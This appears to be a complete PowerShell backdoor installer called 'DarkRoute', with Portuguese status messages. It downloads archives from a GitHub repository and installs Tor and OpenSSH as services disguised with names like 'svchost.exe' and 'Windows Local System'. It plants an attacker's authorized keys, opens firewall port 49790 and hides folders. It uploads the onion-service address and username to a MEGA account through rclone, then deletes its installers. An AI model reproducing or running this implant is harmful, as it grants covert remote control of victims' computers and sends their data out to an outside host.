param ($dir, $gmail, $pass)
if (!$dir -or !$gmail -or !$pass)
{
@"
________                   __   __________                ___
\______ \  _____  _______ |  | _\______   \  ____  __ ___/  |_  ____
 |    |  \ \__  \ \_  __ \|  |/ /|      __/ /  _ \|  |  \   __\/ __ \
 |        \ / __ \ |  | \/|    < |   |   ( (  <_> )  |  /|  | \  ___/
/_______  /(____ / /__|   |__|_ \|___|__  / \____/|____/ |__|  \___  >
        \/     \/              \/       \/                         \/

Exemplo: DarkRoute.exe -gmail exemplodeconta@gmail.com -pass p@ssw0rd -dir pasta
    
 Todos os argumentos sao obrigatorios.

   ARGUMENTOS: 
   
   -dir       Diretorio da conta mega (Onde arquivos de autenticacao sera entregue)
   -gmail     Endereco gmail da conta mega
   -pass      Senha da conta mega
    
"@
} 
else
{
"[*] Ativando suporte a TSL versao 1, 1.1, 1.2, 1.3" 
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"

"[*] Alterando politica de execucao..."
Set-ExecutionPolicy Bypass -Scope LocalMachine -Force -ErrorAction 'SilentlyContinue';
$directory = Test-Path C:\Users\Public\filesystem -ErrorAction 'SilentlyContinue'
if ($directory -eq "true") {} else {mkdir C:\Users\Public\filesystem -ErrorAction 'SilentlyContinue' | Out-Null};
$filelese = Test-Path $env:PUBLIC\filesystem\filelese -ErrorAction 'SilentlyContinue'
if ($filelese -eq "true") {} else {$ProgressPreference = 'SilentlyContinue';
Measure-Command -Expression {Invoke-WebRequest -Uri https://github.com/ucd4cfe/x0nternalsj3a/raw/main/filelese.rar -OutFile $env:PUBLIC\filesystem\filelese.rar} -ErrorAction 'SilentlyContinue' | Out-Null;
C:\Windows\System32\tar.exe -xzf $env:PUBLIC\filesystem\filelese.rar -C $env:PUBLIC\filesystem;
del $env:PUBLIC\filesystem\filelese.rar};

"[*] Abrindo circuito onion..."
C:\Users\Public\filesystem\filelese\.\svchost.exe --service install -options -f "C:\Users\Public\filesystem\filelese\file" | Out-Null;
C:\WINDOWS\system32\sc.exe config tor DisplayName="Windows Service" | Out-Null;
C:\WINDOWS\system32\sc.exe description tor "Windows Service" | Out-Null;
C:\WINDOWS\system32\sc.exe start tor -ErrorAction 'SilentlyContinue' | Out-Null;
attrib +H C:\Users\PC\AppData\Roaming\tor;

"[*] Enviando dados para a nuvem..."
C:\Users\Public\filesystem\filelese\rclone.exe config create MegaCloud mega config_is_local=false --obscure user $gmail pass $pass | Out-Null;
echo $ENV:USERNAME | Out-File C:\Users\Public\filesystem\hiddenService\username.txt;
C:\Users\Public\filesystem\filelese\rclone.exe copy --exclude="*_key" C:\Users\Public\filesystem\hiddenService\ MegaCloud:$dir;
attrib +H C:\Users\PC\AppData\Roaming\rclone;

"[*] Abrindo porta 49790..."
C:\WINDOWS\system32\netsh.exe advfirewall firewall add rule name="Windows Firewall" protocol=TCP dir=in localport=49790 action=allow -ErrorAction 'SilentlyContinue' | Out-Null;

$ssh = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinLsr"
if ($ssh -eq "True") {$WinLsr = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinLsr" -Name Start
if ($WinLsr.Start -eq "2") {"[*] SSH ja se econtra habilitado"; Stop-Service WinLsr; copy C:\Users\Public\filesystem\filelese\administrators_authorized_keys C:\ProgramData\ssh; del C:\ProgramData\ssh\sshd_config; copy C:\Users\Public\filesystem\filelese\sshd_config C:\ProgramData\ssh; Start-Service WinLsr}
else {copy C:\Users\Public\filesystem\filelese\administrators_authorized_keys C:\ProgramData\ssh; del C:\ProgramData\ssh\sshd_config; copy C:\Users\Public\filesystem\filelese\sshd_config C:\ProgramData\ssh; Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\WinLsr -Name Start -Value 2 -Force; Start-Service WinLsr}}

else {"[*] Instalando SSH"; mkdir "C:\Windows\System32\windows" -ErrorAction 'SilentlyContinue' | Out-Null; C:\WINDOWS\system32\attrib.exe +H "C:\Windows\System32\windows" | Out-Null; $ProgressPreference = 'SilentlyContinue'; Measure-Command -Expression {Invoke-WebRequest -Uri 'https://github.com/ucd4cfe/x0nternalsj3a/raw/main/windows.rar' -OutFile "C:\Windows\System32\windows\windows.rar"} | Out-Null; C:\Windows\System32\tar.exe -xzf "C:\Windows\System32\windows\windows.rar" -C "C:\Windows\System32\windows"; del "C:\Windows\System32\windows\windows.rar"; C:\Windows\System32\windows\WinLsr\.\install-sshd.ps1 6>$nul | Out-Null;

Set-Service -Name WinLsr -StartupType 'Automatic' -DisplayName "Windows Local System" -Description "Windows Local System"; Start-Service WinLsr; Stop-Service WinLsr; copy C:\Users\Public\filesystem\filelese\administrators_authorized_keys C:\ProgramData\ssh; del C:\ProgramData\ssh\sshd_config; copy C:\Users\Public\filesystem\filelese\sshd_config C:\ProgramData\ssh; Start-Service WinLsr; C:\WINDOWS\system32\sc.exe description WinSysr "Windows Local Service" | Out-Null; C:\WINDOWS\system32\sc.exe config WinSysr DisplayName="Windows Local Service" | Out-Null};
del C:\Windows\System32\Windows\WinLsr\wuapihost.exe -ErrorAction 'SilentlyContinue' | Out-Null;
del C:\Windows\System32\Windows\WinLsr\install-sshd.ps1 -ErrorAction 'SilentlyContinue' | Out-Null;
sc.exe delete WinSysr -ErrorAction 'SilentlyContinue' | Out-Null;

"[*] Finalizado"
}